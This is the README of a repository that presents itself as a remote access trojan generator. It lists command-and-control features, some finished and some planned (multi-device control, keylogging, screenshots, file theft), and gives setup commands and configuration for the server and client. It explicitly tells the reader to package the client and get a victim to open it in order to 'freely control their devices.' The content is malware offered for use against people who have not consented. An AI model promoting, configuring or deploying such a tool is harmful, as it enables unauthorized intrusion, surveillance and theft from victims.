# remote_access_trojan

Languages: [中文](README.md) [English](README_en.md)

This repository is used to generate Trojans. It is not yet fully developed.

Note: Users are solely responsible for any losses and compensation caused by the use of this software.

## Features:
- Trojans can be packaged into executable files such as exe, elf, apk, and app. ❌
- Trojans support both Chinese and English. ✅
- Trojans use the WSS (WebSocket + SSL) protocol, originally planned to use the TCP protocol. ✅
- Trojans can control the target host through command lines, web pages, and graphical interfaces. ❌
- Trojans can control multiple devices simultaneously. ✅
- Trojans can enter commands on the target host, obtain system information, upload/download files, take screenshots, record audio, view the target's screen in real time, intercept keyboard input, and more. ❌

## Requirements:
- [Python 3.10+](https://www.python.org/downloads/)
- websockets, rich library.
```bash
pip3 install websockets rich
```
- The certificate and key are contained in two files, key.pem and cert.pem, respectively. If you're less concerned about security and simply want to generate a certificate, consider using a self-signed certificate.
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -out cert.pem -days 99999 -subj "/CN=localhost"
```

## How to Use:
### Download
Method 1: Clone this repository and navigate to its directory.
```bash
git clone https://github.com/zhaobokai341/remote_access_trojan.git
cd remote_access_trojan
```
Method 2: Download the compressed package directly from your browser, unzip it, and navigate to its directory.
Method 3: Go to [Releases](https://github.com/zhaobokai341/remote_access_trojan/releases), select the appropriate version, download the file named code.zip, unzip it, and navigate to its directory.

### Configuration
Go to the code directory. There are two folders (zh and en). zh is the Chinese version, and en is the English version. Select the appropriate folder. We'll use en as an example.
Go to the en folder, open the server.py file, and find code similar to this.
```python
HOST = '0.0.0.0'
PORT = 8765
SSL_CERT = '../cert.pem'
SSL_KEY = '../key.pem'
```
Configure HOST and PORT. HOST is the host to connect to, and PORT is the port. Leave them as default.

Configure SSL_CERT and SSL_KEY, and change them to the path to the certificate and key you generated.

Next, open the client.py file and find code similar to this.
```python
HOST = '127.0.0.1'
PORT = 8765
```
Change HOST to the server's IP address, and PORT to the same port as configured on the server.

### Run
In the same directory, open command prompt and enter:
```bash
python server.py
```
This will start the server, which will be used to control all victim devices.

client.py is the client. You can package it into an executable file and have the victim open it. If configured correctly, you will be able to freely control their devices.
